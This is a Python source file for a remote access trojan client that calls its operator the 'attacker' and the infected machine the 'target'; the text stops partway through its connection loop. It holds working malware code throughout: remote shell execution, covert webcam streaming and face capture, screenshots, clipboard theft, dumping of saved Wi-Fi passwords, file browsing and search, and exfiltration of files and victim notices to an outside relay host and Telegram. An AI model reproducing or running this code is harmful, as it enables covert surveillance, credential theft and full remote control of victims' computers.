import socket
import platform
import subprocess
import os
import time
import requests
import json
import base64
import sqlite3
from PIL import ImageGrab
import tempfile
import shutil
import cv2
import numpy as np
import struct
import pickle
import time
import threading
import tkinter as tk
from tkinter import messagebox
from PIL import Image, ImageTk
import io
import zlib # For potential compression
import re
import zipfile
import urllib.request
killed = False
message_os = platform.system() + " " + platform.release()
MESSAGE = f"New Target are online:\n{message_os}"
temp_dir = tempfile.gettempdir()


def send_message_proxy(message):
    try:
        proxy_url = "https://shelcloud.pythonanywhere.com/send_message"
        payload = {
            "message": message,
            "api_key": "mysecretapikey123"  # Must match the one in relay.py
        }
        headers = {"Content-Type": "application/json"}
        requests.post(proxy_url, json=payload, headers=headers)
    except Exception as e:
        print(f"[!] Failed to send message to proxy: {e}")
def send_file_to_proxy(file_path, is_image=False):
    with open(file_path, "rb") as f:
        data_b64 = base64.b64encode(f.read()).decode()

    payload = {
        "api_key": "mysecretapikey123",
        "filename": file_path.split("\\")[-1],
        "type": "image" if is_image else "file",
        "data": data_b64
    }

    try:
        res = requests.post("https://shelcloud.pythonanywhere.com/send_file", json=payload)
        print("[DEBUG] Status:", res.status_code)
        print("[DEBUG] Raw Response:", res.text)

        # Attempt to parse JSON only if response is OK
        if res.headers.get("Content-Type", "").startswith("application/json"):
            print(res.json())
        else:
            print("[!] Non-JSON response received.")

    except Exception as e:
        print(f"[!] Failed to send file: {e}")




def handle_stream_camera(command_args, sock):
    """
    Captures video frames from the webcam, encodes them, and streams them
    to the attacker. Supports quality settings and a stop command.
    """
    try:
        parts = command_args.split()
        camera_index = int(parts[0])
        quality = parts[1] if len(parts) > 1 else "medium" # Default to medium

        # Define quality parameters (JPEG compression quality)
        # Higher value means better quality, larger file size
        quality_map = {
            "low": 30,
            "medium": 60,
            "high": 90
        }
        jpeg_quality = quality_map.get(quality, 60) # Default to medium if invalid

        cap = cv2.VideoCapture(camera_index, cv2.CAP_DSHOW)
        if not cap.isOpened():
            sock.sendall(f"ERROR:Could not open camera {camera_index}".encode("utf-8"))
            return

        # Set resolution (optional, adjust as needed for performance/quality)
        # cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
        # cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)

        print(f"[*] Starting camera stream on camera {camera_index} with quality: {quality} (JPEG Q={jpeg_quality})...")
        # Ensure the socket is blocking for initial confirmation send
        sock.settimeout(None)
        sock.sendall(b"STREAM_STARTED") # Confirm stream initiation to attacker

        while True:
            # Check for a stop or quality command from the attacker (non-blocking)
            sock.settimeout(0.01) # Very short timeout for non-blocking recv
            try:
                control_cmd = sock.recv(1024).decode("utf-8")
                if control_cmd == "stop_stream":
                    print("[*] Stop stream command received. Halting camera stream.")
                    break
                elif control_cmd.startswith("set_quality"):
                    new_quality = control_cmd.split()[1]
                    jpeg_quality = quality_map.get(new_quality, jpeg_quality)
                    print(f"[*] Quality updated to: {new_quality} (JPEG Q={jpeg_quality})")
            except socket.timeout:
                pass # This is expected when no control command is sent
            except (ConnectionResetError, BrokenPipeError):
                print("[!] Attacker disconnected during stream.")
                break # Connection lost
            except Exception as e:
                print(f"[!] Error receiving control command: {e}")

            ret, frame = cap.read()
            if not ret:
                print("[!] Failed to read frame from camera.")
                time.sleep(0.1) # Avoid busy-waiting if camera fails
                continue

            # Encode the frame to JPEG with the current quality setting
            is_success, buffer = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), jpeg_quality])
            if is_success:
                frame_bytes = buffer.tobytes()
                size_prefix = struct.pack("<L", len(frame_bytes)) # Pack size into 4 bytes

                try:
                    # Set socket to blocking mode for sending frames to prevent timeout
                    sock.settimeout(None)
                    sock.sendall(size_prefix + frame_bytes)
                except (ConnectionResetError, BrokenPipeError):
                    print("[!] Attacker disconnected during frame send.")
                    break # Connection lost
                except Exception as e:
                    print(f"[!] Error sending frame: {e}")
                    # If sending fails, break the loop to prevent continuous errors
                    break
            else:
                print("[!] Failed to encode frame to JPEG.")


            # Small delay to prevent 100% CPU usage and allow other operations
            time.sleep(0.01)

    except Exception as e:
        print(f"[!] Error in handle_stream_camera: {e}")
        try:
            # Send error message back to attacker if possible
            sock.sendall(f"ERROR: {e}".encode("utf-8"))
        except:
            pass # Ignore if socket is already closed
    finally:
        if 'cap' in locals() and cap.isOpened():
            cap.release()
            print("[*] Camera released.")
        # Reset socket timeout to blocking mode for general commands
        if sock:
            sock.settimeout(None)
            print("[*] Socket timeout reset to blocking.")
        print("[*] Camera stream stopped.")




# Add this function anywhere alongside your other handler functions (e.g., after show_popup)
def send_json_response(sock, data):
    """
    Sends a JSON-encoded dictionary, prefixed with its length, over the socket.
    """
    try:
        json_data = json.dumps(data).encode("utf-8")
        message_length = len(json_data)
        # Pack the length as a 4-byte unsigned integer in network byte order
        length_prefix = struct.pack("!I", message_length)
        sock.sendall(length_prefix + json_data)
        print(f"[*] Sent {message_length} bytes of JSON data to attacker.")
    except Exception as e:
        print(f"[!] Error sending JSON response: {e}")

def handle_nmap_scan(command_args, sock):
    """
    Handles Nmap installation (if needed) and execution on the target,
    then sends the results (or error/timeout message) back to the attacker.
    """
    nmap_url = "https://nmap.org/dist/nmap-7.91-win32.zip"
    nmap_zip_name = "nmap-7.91-win32.zip"
    # Determine the folder name after extraction. This can vary based on the zip content.
    # Common convention is that nmap-X.YY-win32.zip extracts to a folder like nmap-X.YY
    nmap_folder_name = "nmap-7.91" # Update this if the extracted folder name differs
    nmap_exe_path = os.path.join(tempfile.gettempdir(), nmap_folder_name, "nmap.exe")

    response_data = {"status": "error", "error": "An unknown error occurred during Nmap operation."}

    try:
        # 1. Check if Nmap is already installed and executable
        if not os.path.exists(nmap_exe_path):
            print("[*] Nmap not found. Attempting to install...")
            temp_zip_path = os.path.join(tempfile.gettempdir(), nmap_zip_name)
            extract_dir = os.path.join(tempfile.gettempdir(), nmap_folder_name)

            # Clean up old extraction directory if it exists and is not the correct Nmap path
            if os.path.exists(extract_dir) and not os.path.isdir(os.path.join(extract_dir, "nmap.exe")):
                print(f"[*] Removing incomplete/old Nmap directory: {extract_dir}")
                shutil.rmtree(extract_dir)

            # Download Nmap
            print(f"[*] Downloading Nmap from {nmap_url} to {temp_zip_path}...")
            urllib.request.urlretrieve(nmap_url, temp_zip_path)
            print("[+] Nmap download complete.")

            # Extract Nmap
            print(f"[*] Extracting Nmap to {tempfile.gettempdir()}...")
            with zipfile.ZipFile(temp_zip_path, 'r') as zip_ref:
                zip_ref.extractall(tempfile.gettempdir()) # Extract to temp directory
            print("[+] Nmap extraction complete.")
            os.remove(temp_zip_path) # Clean up zip file
            print("[*] Cleaned up Nmap zip file.")
        else:
            print("[*] Nmap already installed. Skipping installation.")

        # Re-check if nmap.exe is now present after installation/check
        if not os.path.exists(nmap_exe_path):
            response_data["error"] = f"Nmap executable not found at {nmap_exe_path} after installation attempt. Installation might have failed."
            print(f"[!] Error: {response_data['error']}")
            send_json_response(sock, response_data)
            return

        # 2. Execute Nmap command
        # Use quotes around nmap_exe_path to handle spaces in file paths
        full_command = f'"{nmap_exe_path}" {command_args}'
        print(f"[*] Executing Nmap command: {full_command}")

        process_result = None
        try:
            # Set a very generous timeout for Nmap execution (e.g., 20 minutes)
            # IMPORTANT: For very broad scans (like scanning an entire network or the internet),
            # this timeout might still need to be increased further (e.g., 30-60 minutes).
            process_result = subprocess.run(
                full_command,
                shell=True,
                capture_output=True,
                text=True, # Use text=True for string output
                timeout=2000 # 1200 seconds = 45 minutes
            )

            print(f"[*] Nmap process finished with return code: {process_result.returncode}")
            print(f"[*] Nmap stdout length: {len(process_result.stdout)} bytes")
            if process_result.stderr:
                print(f"[*] Nmap stderr length: {len(process_result.stderr)} bytes")

            response_data["status"] = "success"
            response_data["output"] = process_result.stdout
            response_data["error"] = process_result.stderr # Nmap can output warnings/errors to stderr even on success

            if process_result.returncode != 0:
                if not process_result.stderr:
                    response_data["error"] = f"Nmap exited with non-zero code {process_result.returncode} but no stderr. Output:\n{process_result.stdout}"
                response_data["status"] = "error" # Change status to error if Nmap itself failed
                print(f"[!] Nmap execution error: {response_data['error']}")

        except subprocess.TimeoutExpired as e:
            process_result = e.output # Get any output before timeout
            response_data["status"] = "timeout"
            response_data["error"] = f"Nmap command timed out after {e.timeout} seconds. Process terminated. Partial output:\n{e.stdout}"
            print(f"[!] Nmap command timed out: {command_args}. Partial output:\n{e.stdout}")
            # Attempt to kill the process if it's still alive (should be handled by subprocess.run)
            if hasattr(e, 'process') and e.process.poll() is None:
                e.process.kill()
        except FileNotFoundError:
            response_data["error"] = "Nmap executable not found (should not happen after initial check)."
            print("[!] Nmap executable not found unexpectedly.")
        except Exception as e:
            response_data["error"] = f"An unexpected error occurred during Nmap execution: {e}"
            print(f"[!] Unexpected error during Nmap execution: {e}")

    except Exception as e: # Catch errors from download/extraction
        response_data["error"] = f"An error occurred during Nmap installation or preparation: {e}"
        print(f"[!] Error during Nmap installation/preparation: {e}")
    finally:
        # Crucially, always send a response back
        print("[*] Preparing to send Nmap results/status to attacker.")
        send_json_response(sock, response_data)
        print("[*] Nmap operation complete for this request.")
















def show_popup(title, message):
    try:
        root = tk.Tk()
        root.withdraw()
        messagebox.showinfo(title, message)
        root.destroy()
    except Exception as e:
        print(f"[!] Error showing popup: {e}")











# Your handle_list_dir function (where you *call* send_json_response)
def handle_list_dir(command_args, sock):
    """
    Lists files and directories in a given path on the target and sends
    the structured response (JSON) back to the attacker.
    """
    path_to_list = command_args.strip()
    response_data = {"status": "error", "error": "Unknown error."}

    try:
        if not os.path.exists(path_to_list):
            response_data = {"status": "error", "error": f"Path not found: {path_to_list}"}
        elif not os.path.isdir(path_to_list):
            response_data = {"status": "error", "error": f"Not a directory: {path_to_list}"}
        else:
            items = []
            with os.scandir(path_to_list) as entries:
                for entry in entries:
                    item_info = {
                        "name": entry.name,
                        "type": "dir" if entry.is_dir() else "file",
                        "size": entry.stat().st_size if entry.is_file() else 0 # Size for files
                    }
                    items.append(item_info)
            response_data = {"status": "success", "data": items}
            print(f"[DEBUG] Listed directory {path_to_list} successfully.")

    except PermissionError:
        response_data = {"status": "error", "error": f"Permission denied for {path_to_list}"}
    except Exception as e:
        response_data = {"status": "error", "error": f"Error listing directory: {e}"}
    
    send_json_response(sock, response_data) # Here you call the function

# Your handle_view_file function (where you *call* send_json_response)
def handle_view_file(command_args, sock):
    """
    Reads content of a specified file on the target and sends it
    back to the attacker as a structured JSON response.
    """
    file_path = command_args.strip()
    response_data = {"status": "error", "error": "Unknown error."}

    try:
        if not os.path.exists(file_path):
            response_data = {"status": "error", "error": f"File not found: {file_path}"}
        elif not os.path.isfile(file_path):
            response_data = {"status": "error", "error": f"Not a file: {file_path}"}
        else:
            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read(1024 * 1024) # Read up to 1MB
            response_data = {"status": "success", "data": content}
            print(f"[DEBUG] Read file {file_path} successfully.")

    except PermissionError:
        response_data = {"status": "error", "error": f"Permission denied for {file_path}"}
    except Exception as e:
        response_data = {"status": "error", "error": f"Error reading file: {e}"}
    
    send_json_response(sock, response_data) # Here you call the function






def handle_image_popup(sock):
    """Receives image data from the attacker and displays it in a Tkinter popup."""
    try:
        # 1. Receive the 16-byte size header from the attacker
        size_data = sock.recv(16)
        if not size_data:
            raise ConnectionError("No size data received for image.")
        image_size = int(size_data.decode("utf-8").strip())

        # 2. Receive the image data in chunks until complete
        received_bytes = 0
        image_data = b""
        while received_bytes < image_size:
            # Read chunks of 4KB or the remaining size, whichever is smaller
            chunk = sock.recv(min(4096, image_size - received_bytes))
            if not chunk:
                raise ConnectionError("Connection lost during image transfer.")
            image_data += chunk
            received_bytes += len(chunk)

        # 3. Define the function that will show the image in a GUI window
        def show_image_in_thread():
            root = None # Initialize root to None
            try:
                # Create the main tkinter window (it will be withdrawn)
                root = tk.Tk()
                root.withdraw()  # Hide the main root window

                # Create a new, top-level window for the popup
                popup_window = tk.Toplevel(root)
                popup_window.title("Image Display")

                # Load the received image data from memory using PIL/Pillow
                pil_image = Image.open(io.BytesIO(image_data))
                photo_image = ImageTk.PhotoImage(pil_image)

                # Create a label widget to hold the image
                image_label = tk.Label(popup_window, image=photo_image)
                
                # IMPORTANT: Keep a reference to the image object to prevent it
                # from being erased by Python's garbage collector.
                image_label.image = photo_image 
                
                image_label.pack()

                # Set a protocol handler for when the window is closed by the user
                # This ensures proper cleanup
                def on_popup_close():
                    try:
                        popup_window.destroy()
                        # When popup_window is destroyed, its root's mainloop will often exit naturally.
                        # Explicitly destroying the root here is the most direct way to clean up.
                        if root: 
                            root.destroy() 
                    except Exception as destroy_e:
                        print(f"[!] Error destroying popup or root window: {destroy_e}")

                popup_window.protocol("WM_DELETE_WINDOW", on_popup_close)
                
                # Start the tkinter event loop for this root. This will block until root.destroy() is called.
                root.mainloop() 
            except Exception as e:
                print(f"[!] Failed to display image popup: {e}")
            finally:
                # This block is primarily for cleanup if an error occurs *before* on_popup_close is triggered,
                # or if mainloop exits unexpectedly.
                # The crucial change is to remove the winfo_exists() check if root might already be destroyed,
                # and catch the TclError if it happens during destruction, indicating it's already gone.
                if root: # Only try to destroy if the root object was actually created
                    try:
                        root.destroy()
                    except tk.TclError as te:
                        # This error means the Tkinter application was already destroyed, which is fine.
                        print(f"[DEBUG] TclError during final root destroy, likely already destroyed by popup close: {te}")
                    except Exception as fe:
                        print(f"[!] Error in final root destroy block: {fe}")

        # 4. Run the GUI function in a separate thread to avoid blocking the main script
        # Ensure the thread is a daemon thread so it doesn't prevent the main program from exiting
        threading.Thread(target=show_image_in_thread, daemon=True).start()

        # 5. Send a success confirmation back to the attacker
        sock.sendall(b"[+] Image popup display command received.")

    except Exception as e:
        error_msg = f"[!] Error handling image popup: {e}"
        print(error_msg)
        try:
            sock.sendall(error_msg.encode("utf-8"))
        except Exception as send_e:
            print(f"[!] Failed to send error message back to attacker: {send_e}")



def execute_shell_command(command: str) -> dict:
    """
    Executes a shell command on the target, handles 'cd' and 'dir',
    and returns stdout, stderr, and the current working directory.
    Includes a timeout to prevent hanging.
    """
    stdout_output = ""
    stderr_output = ""
    current_dir = os.getcwd() # Get current directory before command execution

    try:
        # Handle 'cd' command separately as it's a shell built-in
        if command.lower().startswith("cd "):
            try:
                new_dir = command.split(" ", 1)[1].strip()
                os.chdir(new_dir)
                stdout_output = f"Changed directory to: {os.getcwd()}"
            except FileNotFoundError:
                stderr_output = f"Error: Directory not found: {new_dir}"
            except Exception as e:
                stderr_output = f"Error changing directory: {e}"
        # Handle 'dir' command specifically for Windows if needed, or let shell handle it
        elif command.lower() == "dir" and platform.system() == "Windows":
            result = subprocess.run(
                command,
                shell=True,
                text=True,
                capture_output=True,
                timeout=10 # Add a timeout for the command execution
            )
            stdout_output = result.stdout
            stderr_output = result.stderr
        else:
            # Execute other commands using subprocess.run
            # Use a timeout to prevent commands from hanging indefinitely
            result = subprocess.run(
                command,
                shell=True,
                text=True,
                capture_output=True,
                timeout=30,  # Increased timeout for general commands (adjust as needed)
                cwd=current_dir # Ensure command runs in the current directory
            )
            stdout_output = result.stdout
            stderr_output = result.stderr

    except subprocess.TimeoutExpired:
        stderr_output = f"Error: Command '{command}' timed out after execution."
    except Exception as e:
        stderr_output = f"Error executing command '{command}': {e}"

    # Always return the current working directory after command execution
    return {
        "stdout": stdout_output,
        "stderr": stderr_output,
        "cwd": os.getcwd()
    }

def handle_face_recon(command, sock):
    """Detect faces using webcam, crop them, and send to attacker."""
    try:
        _, cam_index_str = command.split(maxsplit=1)
        camera_index = int(cam_index_str)

        # Determine the directory for saving the cascade file
        # This uses the same logic as where the device_name.txt is stored
        # Ensure 'name_file' is accessible in this scope (it should be if defined globally)
        cascade_dir = os.path.dirname(name_file)
        os.makedirs(cascade_dir, exist_ok=True) # Ensure the directory exists

        cascade_file_name = "haarcascade_frontalface_default.xml"
        cascade_file_path = os.path.join(cascade_dir, cascade_file_name)

        # Check if Haar Cascade file exists, if not, download it
        if not os.path.exists(cascade_file_path):
            print(f"[*] '{cascade_file_name}' not found. Downloading to {cascade_dir}...")
            url = "https://raw.githubusercontent.com/opencv/opencv/master/data/haarcascades/haarcascade_frontalface_default.xml"
            try:
                r = requests.get(url)
                with open(cascade_file_path, 'wb') as f:
                    f.write(r.content)
                print("[+] Download complete.")
            except Exception as e:
                sock.sendall(f"ERROR:Could not download cascade file: {e}".encode("utf-8"))
                return
        else:
            print(f"[*] '{cascade_file_name}' already exists at {cascade_file_path}. Skipping download.")

        face_cascade = cv2.CascadeClassifier(cascade_file_path) # Use the full path here
        if face_cascade.empty():
            sock.sendall(f"ERROR:Could not load cascade classifier from {cascade_file_path}".encode("utf-8"))
            return

        cap = cv2.VideoCapture(camera_index, cv2.CAP_DSHOW)
        if not cap.isOpened():
            sock.sendall(f"ERROR:Could not open camera {camera_index}".encode("utf-8"))
            return

        print(f"[*] Starting face recognition on camera {camera_index}...")
        
        last_face_sent_time = 0
        while True:
            # Check for a stop command from the attacker (non-blocking)
            sock.settimeout(0.01)
            try:
                stop_cmd = sock.recv(1024)
                if stop_cmd.decode("utf-8") == "stop_recon":
                    print("[*] Stop command received. Halting face recognition.")
                    break
            except socket.timeout:
                pass # This is expected
            except (ConnectionResetError, BrokenPipeError):
                break # Connection lost

            ret, frame = cap.read()
            if not ret:
                break
            
            gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
            faces = face_cascade.detectMultiScale(gray, scaleFactor=1.1, minNeighbors=5, minSize=(80, 80))

            for (x, y, w, h) in faces:
                # Send one face every 2 seconds to avoid duplicates
                if time.time() - last_face_sent_time > 2:
                    face_roi = frame[y:y+h, x:x+w]
                    
                    # Encode the face image to JPEG
                    is_success, buffer = cv2.imencode(".jpg", face_roi)
                    if is_success:
                        # Get byte data
                        face_bytes = buffer.tobytes()
                        # Pack size into 4 bytes
                        size_prefix = struct.pack("<L", len(face_bytes))
                        
                        try:
                            # Send size prefix then the data
                            sock.sendall(size_prefix + face_bytes)
                            last_face_sent_time = time.time()
                        except (ConnectionResetError, BrokenPipeError):
                            # Break the inner loop if sending fails
                            break
            # If the inner loop was broken, break the outer one too
            else: 
                continue
            break

    except Exception as e:
        print(f"[!] Error in handle_face_recon: {e}")
    finally:
        if 'cap' in locals() and cap.isOpened():
            cap.release()
            print(f"[DEBUG] handle_face_recon finally block: Attempting to set timeout to None. Current timeout: {sock.gettimeout()}")
            sock.settimeout(None)
            # ADD THIS LINE:
            print(f"[DEBUG] handle_face_recon finally block: Timeout set to None.")
        sock.settimeout(None) # Reset socket to blocking mode
        print("[*] Face recognition process stopped.")

def capture_screenshot():
    """Capture a screenshot of the target's screen."""
    try:
        screenshot = ImageGrab.grab()
        
        # Create a BytesIO object to save the image in memory
        import io
        byte_arr = io.BytesIO()
        screenshot.save(byte_arr, format='PNG')
        return byte_arr.getvalue()
    except Exception as e:
        print(f"[!] Error capturing screenshot: {e}")
        return None

def capture_camera_photo(camera_index):
    """Capture a photo from the specified camera index."""
    try:
        cap = cv2.VideoCapture(camera_index, cv2.CAP_DSHOW)
        if not cap.isOpened():
            return None, f"Error: Could not open camera {camera_index}"
        
        ret, frame = cap.read()
        cap.release()
        
        if ret:
            # Encode the image to JPEG for efficient transfer
            encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 90]
            _, img_encoded = cv2.imencode('.jpg', frame, encode_param)
            return img_encoded.tobytes(), None
        else:
            return None, "Error: Could not read frame from camera."
    except Exception as e:
        return None, f"Error capturing camera photo: {e}"

def list_available_cameras(sock):
    """Scan and return list of available camera indices on the target."""
    try:
        indexes = []
        for index in range(5):  # Scan first 5 indices
            cap = cv2.VideoCapture(index, cv2.CAP_DSHOW)  # Use DirectShow for Windows
            if not cap or not cap.isOpened():
                cap.release()
                continue

            # Try to grab a frame with timeout protection
            cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
            ret, _ = cap.read()
            if ret:
                indexes.append(index)
            cap.release()

        response = "CAMERA_LIST:" + ",".join(map(str, indexes)) if indexes else "CAMERA_LIST:None"
        sock.sendall(response.encode("utf-8"))
    except Exception as e:
        sock.sendall(f"CAMERA_LIST_ERROR:{e}".encode("utf-8"))


def remove_name_from_target():
    """Remove the stored name from the target device."""
    if os.path.exists(name_file):
        try:
            os.remove(name_file)
            return True
        except Exception as e:
            print(f"[ERROR] Failed to remove name: {e}")
    return False


if platform.system() == "Windows":
    name_file = os.path.expandvars(r"%APPDATA%\SystemConfig\device_name.txt")
else:
    name_file = os.path.expanduser("~/.config/.device_name")  # Linux/Mac

def save_name_on_target(name):
    """Save the assigned name to a hidden file on the target device."""
    try:
        os.makedirs(os.path.dirname(name_file), exist_ok=True)  # Ensure the folder exists
        with open(name_file, "w", encoding="utf-8") as f:
            f.write(name)
    except Exception as e:
        print(f"[ERROR] Failed to save name: {e}")

def read_name_from_target():
    """Read the saved name from the target device (if exists)."""
    if os.path.exists(name_file):
        try:
            with open(name_file, "r", encoding="utf-8") as f:
                return f.read().strip()
        except Exception as e:
            print(f"[ERROR] Failed to read name: {e}")
    return "None"  # Default if no name is set




def handle_get_clipboard(sock):
    """Retrieve clipboard content and send to the attacker."""
    try:
        clipboard_content = "Clipboard is empty or unsupported on this system."
        if platform.system() == "Windows":
            import win32clipboard
            win32clipboard.OpenClipboard()
            clipboard_content = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
        elif platform.system() == "Linux":
            clipboard_content = subprocess.getoutput("xclip -o -selection clipboard")

        sock.sendall(clipboard_content.encode("utf-8") + b"END_OF_CLIPBOARD")
    except Exception as e:
        sock.sendall(f"Error retrieving clipboard: {e}".encode("utf-8"))



def get_saved_wifi(sock):
    try:
        if platform.system() == "Windows":
            profiles_output = subprocess.check_output(
                "netsh wlan show profiles", shell=True, encoding="utf-8", errors="ignore"
            )
            profiles = [
                line.split(":")[1].strip()
                for line in profiles_output.splitlines()
                if "All User Profile" in line
            ]

            results = []
            for profile in profiles:
                # Get detailed information about the profile
                profile_info = subprocess.check_output(
                    f"netsh wlan show profile name=\"{profile}\" key=clear",
                    shell=True,
                    encoding="utf-8",
                    errors="ignore"
                )

                # Extract relevant details
                authentication_type = None
                password = None
                for line in profile_info.splitlines():
                    if "Authentication" in line:
                        authentication_type = line.split(":")[1].strip()
                    if "Key Content" in line:
                        password = line.split(":")[1].strip()

                # Add simplified result
                results.append(
                    f"Network Name: {profile}\n"
                    f"Authentication: {authentication_type or 'Unknown'}\n"
                    f"Password: {password or 'None'}\n"
                )

            response = "\n".join(results)
        else:
            response = "Wi-Fi password retrieval is not supported on this OS."

        sock.sendall(response.encode("utf-8") + b"END_OF_INFO")
    except Exception as e:
        sock.sendall(f"Error retrieving Wi-Fi details: {e}\nEND_OF_INFO".encode("utf-8"))
        
def get_system_info():
    """Gather detailed system information and return as a string."""
    try:
        import psutil  # External library for system information (assumed to be present)
        
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        os_info = f"{platform.system()} {platform.release()} (Version: {platform.version()})"
        architecture = platform.architecture()[0]
        cpu_info = platform.processor()
        ram_info = psutil.virtual_memory().total / (1024 ** 2)  # Convert to MB
        disk_info = psutil.disk_usage('/').total / (1024 ** 3)  # Convert to GB
        network_info = psutil.net_if_addrs()
        process_info = [proc.info for proc in psutil.process_iter(attrs=['pid', 'name', 'username'])]
        disk_partitions = psutil.disk_partitions()
        disk_usage_details = "\n".join([f"Device: {p.device}, Mountpoint: {p.mountpoint}, Filesystem: {p.fstype}, Usage: {psutil.disk_usage(p.mountpoint).percent}%" for p in disk_partitions])
        network_interfaces = psutil.net_if_stats()
        network_details = "\n".join([f"{iface}: {addrs[0].address}" for iface, addrs in network_info.items() if addrs])
        network_config = psutil.net_if_addrs()
        gateway_info = psutil.net_if_stats()
        env_vars = os.environ
        installed_programs = subprocess.getoutput("wmic product get name,version") if platform.system() == "Windows" else "N/A for non-Windows systems"
        

        process_details = "\n".join([f"PID: {p['pid']}, Name: {p['name']}, User: {p['username']}" for p in process_info])

        info = (
            f"Hostname: {hostname}\n"
            f"Local IP: {local_ip}\n"
            f"Operating System: {os_info}\n"
            f"Architecture: {architecture}\n"
            f"CPU: {cpu_info}\n"
            f"Total RAM: {ram_info:.2f} MB\n"
            f"Total Disk Space: {disk_info:.2f} GB\n"
            f"Disk Partitions and Usage:\n{disk_usage_details}\n"
            f"Network Interfaces:\n{network_details}\n"
            f"Environment Variables:\n{env_vars}\n"
            f"Installed Programs:\n{installed_programs}\n"
            f"Running Processes:\n{process_details}\n"
        )
        print("[DEBUG] System information gathered successfully.")
        return info + "END_OF_INFO"
    except Exception as e:
        print(f"[DEBUG] Error gathering system information: {e}")
        return f"Error gathering system information: {e}END_OF_INFO"



def send_message(bot_token, chat_id, message):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": message
    }
    try:
        response = requests.post(url, json=payload)
        send = True
    except :
        send = False
def is_target_online():
    """Check if the target device has an active internet connection."""
    try:
        requests.get("http://www.google.com", timeout=5)
        return True
    except requests.ConnectionError:
        return False
def is_attacker_online(server_ip, server_port):
    """Check if the attacker server is online."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)  
        s.connect((server_ip, server_port))
        s.sendall("HEARTBEAT_CHECK".encode("utf-8"))  
        s.close()
        return True
    except socket.error:
        return False
def get_available_drives():
    """Return a list of available drives on the target system."""
    if platform.system() == "Windows":
        from string import ascii_uppercase
        drives = [f"{d}:/" for d in ascii_uppercase if os.path.exists(f"{d}:/")]
    else:
        drives = ["/"]  
    return drives
def find_files_by_extension(directories, extensions, excluded_dirs=None):
    """Search for files with the specified extensions in given directories, excluding specific directories."""
    matched_files = []
    excluded_dirs = [os.path.normpath(d) for d in (excluded_dirs or [])]  
    for directory in directories:
        for root, _, files in os.walk(directory):
            root_normalized = os.path.normpath(root)
            if any(root_normalized.startswith(excluded) for excluded in excluded_dirs):
                continue
            for file in files:
                if file.lower().endswith(extensions):
                    matched_files.append(os.path.join(root, file))
    return matched_files




def handle_search_files(command, sock):
    """Handle file search by extension with chunked transfer and keep-alive."""
    try:
        args = command.split()
        extension = args[1].lower()
        excluded_dirs = []
        
        if '--not-system' in args:
            excluded_dirs = [
                r"C:\Windows",
                r"C:\Program Files",
                r"C:\Program Files (x86)",
                r"C:\ProgramData",
                r"C:\System Volume Information"
            ]
        
        # Search all available drives by default
        search_dirs = get_available_drives()
        
        found_files = []
        for directory in search_dirs:
            for root, dirs, files in os.walk(directory):
                # Skip excluded directories
                root_normalized = os.path.normpath(root)
                if any(root_normalized.startswith(excluded) for excluded in excluded_dirs):
                    dirs[:] = []  # Don't traverse into excluded dirs
                    continue
                
                for file in files:
                    if file.lower().endswith(f".{extension}"):
                        file_path = os.path.join(root, file)
                        found_files.append(file_path)
                        try:
                            sock.sendall(f"{file_path}\n".encode("utf-8"))
                        except (BrokenPipeError, ConnectionResetError):
                            return
        
        if not found_files:
            sock.sendall(b"No files found matching the criteria\n")
        
        sock.sendall(b"END_OF_SEARCH\n")
    
    except Exception as e:
        sock.sendall(f"SEARCH_ERROR:{str(e)}\n".encode("utf-8"))


def handle_command(command: str, sock: socket.socket):
    """
    Handle a single command execution, sending results over the provided socket.
    This function supports both foreground and non-blocking commands,
    and uses a consistent JSON-based, length-prefixed response protocol.
    """
    stdout_output = ""
    stderr_output = ""
    current_dir = os.getcwd() # Get current directory for response

    try:
        parts = command.split()
        if len(parts) > 1 and parts[0].lower() in ["start", "open"]:
            # For 'start'/'open' commands, just launch and report success/failure
            try:
                subprocess.Popen(" ".join(parts[1:]), shell=True,
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                stdout_output = f"Started background process: {' '.join(parts[1:])}"
            except Exception as e:
                stderr_output = f"Error starting background process: {e}"
        elif command.endswith("&"):
            # For commands ending with '&', launch in background and report
            try:
                subprocess.Popen(command[:-1], shell=True,
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                stdout_output = f"Running in background: {command[:-1]}"
            except Exception as e:
                stderr_output = f"Error running background command: {e}"
        else:
            # For all other commands (foreground), use the robust execute_shell_command
            shell_result = execute_shell_command(command)
            stdout_output = shell_result.get('stdout', '')
            stderr_output = shell_result.get('stderr', '')
            current_dir = shell_result.get('cwd', os.getcwd()) # Update CWD from shell_result

    except Exception as e:
        stderr_output = f"[!] Failed to process command: {e}"

    # Prepare the JSON response
    response_data = {
        "stdout": stdout_output,
        "stderr": stderr_output,
        "cwd": current_dir # Always send current working directory
    }
    json_response = json.dumps(response_data)
    response_bytes = json_response.encode("utf-8")

    # Prefix the response with its size
    size_prefix = struct.pack("!Q", len(response_bytes)) # !Q for network byte order, unsigned long long

    try:
        sock.sendall(size_prefix + response_bytes)
        print(f"[DEBUG] Sent shell command response ({len(response_bytes)} bytes) for command: {command}")
    except (ConnectionResetError, BrokenPipeError) as send_error:
        print(f"[!] Connection lost while sending shell response: {send_error}")
        # In a real application, you'd likely want to break the main loop here
        # or signal a disconnection to the connect_to_server function.
    except Exception as send_error:
        print(f"[!] Error sending shell response: {send_error}")



def connect_to_server(server_ip, server_port):
    global killed
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((server_ip, server_port))
        os_info = platform.system() + " " + platform.release()
        public_ip = requests.get("https://api64.ipify.org").text.strip()
        device_name = read_name_from_target()  # Read stored name

        # ✅ Fix: Send data in a clear format with a delimiter
        sock.sendall(f"{os_info}|{public_ip}|{device_name}\n".encode("utf-8"))
        
        while True:
            
            try:
                    # ADD THESE LINES:
                print(f"[DEBUG] connect_to_server loop start: Current socket timeout is {sock.gettimeout()}.")
